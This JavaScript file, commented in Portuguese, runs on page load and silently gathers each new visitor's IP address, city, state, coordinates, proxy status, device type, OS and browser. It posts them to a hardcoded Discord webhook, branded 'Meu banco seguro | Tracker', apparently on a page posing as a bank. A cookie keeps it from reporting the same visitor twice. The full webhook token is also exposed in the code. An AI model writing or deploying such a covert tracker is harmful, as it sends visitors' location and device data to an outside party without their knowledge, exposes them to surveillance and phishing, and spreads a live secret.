document.addEventListener("DOMContentLoaded", () => {
  const debug = false;
  const webhook =
    "https://discord.com/api/webhooks/1390153902997110834/xm_XiN-z6dT1teIIOo0aJqwPRgabEYbdH1zWEF4m1_08FCPk7GZFpfRd9tXSaIMLIdUl";

  function setCookie(name, value, days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    document.cookie = `${name}=${value}; expires=${date.toUTCString()}; path=/`;
  }

  function getCookie(name) {
    const cookies = document.cookie.split("; ");
    for (let cookie of cookies) {
      const [key, value] = cookie.split("=");
      if (key === name) return value;
    }
    return null;
  }

  async function getIpInfo() {
    try {
      const ipResponse = await $.get("https://api64.ipify.org?format=json");
      const ipData = await $.get(
        `https://freeipapi.com/api/json/${ipResponse.ip}`
      );

      return {
        ip: ipResponse.ip,
        city: ipData.cityName || "Desconhecido",
        state: ipData.regionName || "Desconhecido",
        isProxy: ipData.isProxy || false,
        latitude: ipData.latitude?.toString() || "Desconhecido",
        longitude: ipData.longitude?.toString() || "Desconhecido",
      };
    } catch (error) {
      return {
        ip: "Não foi possível coletar o IP",
        city: "Desconhecido",
        state: "Desconhecido",
        isProxy: false,
        latitude: "Desconhecido",
        longitude: "Desconhecido",
      };
    }
  }

  function getDeviceInfo() {
    const userAgent = navigator.userAgent;

    let deviceType = "Desktop";
    if (/Mobi|Android|iPhone/i.test(userAgent)) {
      deviceType = "Mobile";
    } else if (/Tablet|iPad/i.test(userAgent)) {
      deviceType = "Tablet";
    }

    let os = "Desconhecido";
    if (/Windows/i.test(userAgent)) os = "Windows";
    else if (/Mac/i.test(userAgent)) os = "MacOS";
    else if (/Linux/i.test(userAgent)) os = "Linux";
    else if (/Android/i.test(userAgent)) os = "Android";
    else if (/iOS|iPhone|iPad/i.test(userAgent)) os = "iOS";

    let browser = "Desconhecido";
    if (/Chrome/i.test(userAgent)) browser = "Chrome";
    else if (/Safari/i.test(userAgent)) browser = "Safari";
    else if (/Firefox/i.test(userAgent)) browser = "Firefox";
    else if (/Edge/i.test(userAgent)) browser = "Edge";
    else if (/MSIE|Trident/i.test(userAgent)) browser = "Internet Explorer";

    return { deviceType, os, browser };
  }

  async function sendData() {
    const deviceInfo = getDeviceInfo();
    const ipInfo = await getIpInfo();

    // Envia primeiro webhook com apenas o IP
    $.ajax({
      url: webhook,
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({
        content: `🛰️ IP detectado: \`${ipInfo.ip}\``,
        username: "IP Inicial | Tracker",
      }),
      success: () => console.log("IP enviado."),
      error: (err) => console.error("Erro ao enviar IP:", err),
    });

    // Envia segundo webhook com dados completos
    const collectedData = {
      ...deviceInfo,
      ...ipInfo,
    };

    $.ajax({
      url: webhook,
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({
        content: "# Nova visita!",
        embeds: [
          {
            title: "Dados do site",
            color: 3125065,
            fields: [{ name: "Versão", value: "1.2" }],
            author: {
              name: "slx10",
              url: "https://github.com/slx10",
              icon_url: "https://github.com/slx10.png",
            },
          },
          {
            title: "Dados de conexão",
            color: 3125065,
            fields: [
              { name: "IP", value: collectedData.ip },
              { name: "Cidade", value: collectedData.city },
              { name: "Estado", value: collectedData.state },
              { name: "Latitude", value: collectedData.latitude },
              { name: "Longitude", value: collectedData.longitude },
              { name: "Está usando proxy?", value: collectedData.isProxy ? "✅" : "❌" },
            ],
          },
          {
            title: "Dados do Hardware",
            color: 3125065,
            fields: [
              { name: "Plataforma", value: collectedData.deviceType },
              { name: "OS", value: collectedData.os },
              { name: "Navegador", value: collectedData.browser },
            ],
            footer: { text: "Meu banco seguro TRACKER 1.1" },
          },
        ],
        username: "Meu banco seguro | Tracker",
        avatar_url:
          "https://raw.githubusercontent.com/ceevdev/ceev-html/refs/heads/main/img/favicon.ico",
      }),
      success: (response) => {
        console.log("Dados completos enviados com sucesso:", response);
        setCookie("bancoseguro_visited", "true", 7);
      },
      error: (err) => {
        console.error("Erro ao enviar dados completos:", err);
      },
    });
  }

  if (!debug && !getCookie("bancoseguro_visited")) {
    sendData();
  } else {
    console.log("Dados já enviados anteriormente.");
  }
});
